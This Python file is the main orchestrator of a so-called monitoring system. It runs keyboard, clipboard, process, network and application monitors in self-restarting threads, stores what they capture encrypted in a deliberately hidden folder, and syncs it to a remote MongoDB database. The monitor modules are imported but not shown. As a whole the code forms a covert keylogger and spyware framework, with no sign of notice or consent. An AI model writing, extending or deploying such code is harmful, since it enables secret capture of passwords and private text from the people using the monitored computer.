import os
import logging
import time
from threading import Thread, Event
from datetime import datetime
from typing import Dict, List, Optional, Protocol, Any
import signal
import sys
from pathlib import Path
from dotenv import load_dotenv

from utils import (
    initialize_utils,
    FileSystemUtils,
    SystemUtils,
    error_handler
)
from security import load_encryption_key
from monitors.keyboard_monitor import KeyboardMonitor
from monitors.clipboard_monitor import ClipboardMonitor
from monitors.process_monitor import ProcessMonitor
from monitors.network_monitor import NetworkMonitor
from monitors.app_monitor import AppMonitor
from data_handlers.storage_handler import StorageHandler
from data_handlers.sync_handler import MongoSyncHandler

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('system.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class MonitorProtocol(Protocol):
    """Protocol defining the required interface for monitors"""
    def start_monitoring(self) -> None:
        """Start monitoring process"""
        ...
        
    def stop_monitoring(self) -> None:
        """Stop monitoring process"""
        ...


class MonitoringSystem:
    """Central monitoring system manager"""
    
    def __init__(self):
        self.storage_handler: Optional[StorageHandler] = None
        self.sync_handler: Optional[MongoSyncHandler] = None
        self.monitors: Dict[str, MonitorProtocol] = {}
        self.monitor_threads: List[Thread] = []
        self.stop_event = Event()
        
        # System statistics
        self.stats = {
            'start_time': None,
            'restart_count': {},
            'last_error': None,
            'total_errors': 0,
            'system_uptime': 0
        }

        # Load environment variables
        load_dotenv()
        self.validate_environment()

    def validate_environment(self) -> None:
        """Validate required environment variables"""
        required_vars = [
            'ENCRYPTION_KEY',
            'MONGO_URI',
            'LOG_LEVEL',
            'DATA_DIR',
            'MONITOR_CHECK_INTERVAL'
        ]
        
        missing_vars = [var for var in required_vars if not os.getenv(var)]
        if missing_vars:
            raise EnvironmentError(f"Missing required environment variables: {', '.join(missing_vars)}")


    @error_handler
    def initialize_system(self) -> bytes:
        """Initialize system components with enhanced error handling"""
        try:
            # Initialize utility systems first
            initialize_utils()
            
            # Ensure logs directory exists and is hidden
            data_dir = Path(os.getenv('DATA_DIR', 'data'))
            logs_path = FileSystemUtils.ensure_hidden_folder(data_dir / "logs")
            
            # Load encryption key
            encryption_key = load_encryption_key()

            # Configure logging based on environment
            log_level = getattr(logging, os.getenv('LOG_LEVEL', 'INFO').upper())
            logging.getLogger().setLevel(log_level)
            
            # Log system information
            sys_info = SystemUtils.get_system_info()
            logging.info(f"System initialized with configuration: {sys_info}")
            
            self.stats['start_time'] = datetime.now().isoformat()
            return encryption_key
            
        except Exception as e:
            logging.critical(f"Failed to initialize system: {str(e)}", exc_info=True)
            raise

    def setup_signal_handlers(self) -> None:
        """Set up signal handlers for graceful shutdown"""
        def signal_handler(signum: int, frame: Any) -> None:
            logging.info(f"Received signal {signum}")
            self.stop_event.set()
            
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)

    def initialize_monitors(self, encryption_key: bytes):
        """Initialize monitoring components"""
        try:
            # Initialize handlers
            self.storage_handler = StorageHandler(encryption_key)
            self.sync_handler = MongoSyncHandler()
            
            # Initialize monitors
            self.monitors = {
                "keyboard": KeyboardMonitor(self.storage_handler),
                "clipboard": ClipboardMonitor(self.storage_handler),
                "process": ProcessMonitor(self.storage_handler),
                "network": NetworkMonitor(self.storage_handler),
                "app": AppMonitor(self.storage_handler)
            }
            
            logging.info("All monitors initialized successfully")
            
        except Exception as e:
            logging.critical(f"Failed to initialize monitors: {str(e)}", exc_info=True)
            raise

    def start_monitor_thread(self, name: str, monitor: MonitorProtocol) -> Thread:
        """Start a monitor in a new thread with error handling"""
        thread = Thread(
            target=self._monitor_wrapper,
            args=(name, monitor),
            name=f"{name}_monitor",
            daemon=True
        )
        thread.start()
        logging.info(f"Started {name} monitor")
        return thread

    def _monitor_wrapper(self, name: str, monitor: MonitorProtocol) -> None:
        """
        Wrapper function for monitor execution with enhanced error handling
        
        Args:
            name (str): Name of the monitor
            monitor (MonitorProtocol): Monitor object implementing required methods
        """
        try:
            # Validate monitor has required methods
            if not hasattr(monitor, 'start_monitoring'):
                raise AttributeError(f"Monitor {name} missing required start_monitoring method")
                
            # Start monitoring
            monitor.start_monitoring()
            
        except Exception as e:
            # Update error statistics
            self.stats['last_error'] = {
                'monitor': name,
                'error': str(e),
                'time': datetime.now().isoformat(),
                'error_type': type(e).__name__
            }
            self.stats['total_errors'] += 1
            
            # Log the error
            logging.error(
                f"Error in {name} monitor: {str(e)}", 
                exc_info=True,
                extra={'monitor_name': name}
            )
            
            # Re-raise critical errors
            if isinstance(e, (SystemExit, KeyboardInterrupt)):
                raise

    @error_handler
    def check_thread_health(self) -> None:
        """Monitor and maintain thread health"""
        check_interval = int(os.getenv('MONITOR_CHECK_INTERVAL', '5'))
        
        while not self.stop_event.is_set():
            for thread in self.monitor_threads[:]:
                try:
                    if not thread.is_alive():
                        monitor_name = thread.name.split('_')[0]
                        
                        # Update restart statistics
                        self.stats['restart_count'][monitor_name] = \
                            self.stats['restart_count'].get(monitor_name, 0) + 1
                        
                        logging.warning(
                            f"Thread {thread.name} died, restarting... "
                            f"(Restart count: {self.stats['restart_count'][monitor_name]})"
                        )
                        
                        # Start new thread
                        if monitor_name in self.monitors:
                            new_thread = self.start_monitor_thread(
                                monitor_name,
                                self.monitors[monitor_name]
                            )
                            
                            # Update thread list
                            self.monitor_threads.remove(thread)
                            self.monitor_threads.append(new_thread)
                            
                except Exception as e:
                    logging.error(f"Error handling thread {thread.name}: {str(e)}", exc_info=True)
                    
            time.sleep(check_interval)

    def start_monitoring_system(self) -> None:
        """Start the monitoring system with enhanced error handling"""
        try:
            # Initialize system
            encryption_key = self.initialize_system()
            
            # Set up signal handlers
            self.setup_signal_handlers()
            
            # Initialize monitors
            self.initialize_monitors(encryption_key)
            
            # Start monitor threads
            for name, monitor in self.monitors.items():
                thread = self.start_monitor_thread(name, monitor)
                self.monitor_threads.append(thread)
            
            # Start sync handler
            sync_thread = Thread(
                target=self._monitor_wrapper,
                args=("sync", self.sync_handler),
                name="mongo_sync",
                daemon=True
            )
            sync_thread.start()
            self.monitor_threads.append(sync_thread)
            
            # Monitor thread health
            self.check_thread_health()
            
        except Exception as e:
            logging.critical(f"Critical error in monitoring system: {str(e)}", exc_info=True)
            raise
        finally:
            self.cleanup()

    def cleanup(self):
        """Perform cleanup operations"""
        try:
            logging.info("Performing system cleanup...")
            # Add cleanup logic here (e.g., closing connections, saving state)
        except Exception as e:
            logging.error(f"Error during cleanup: {str(e)}", exc_info=True)

def main():
    """Main entry point with enhanced error handling"""
    monitoring_system = MonitoringSystem()
    
    try:
        monitoring_system.start_monitoring_system()
    except KeyboardInterrupt:
        logging.info("Monitoring system stopped by user")
    except Exception as e:
        logging.critical(f"Fatal error: {str(e)}", exc_info=True)
        sys.exit(1)
    finally:
        monitoring_system.stop_event.set()

if __name__ == "__main__":
    main()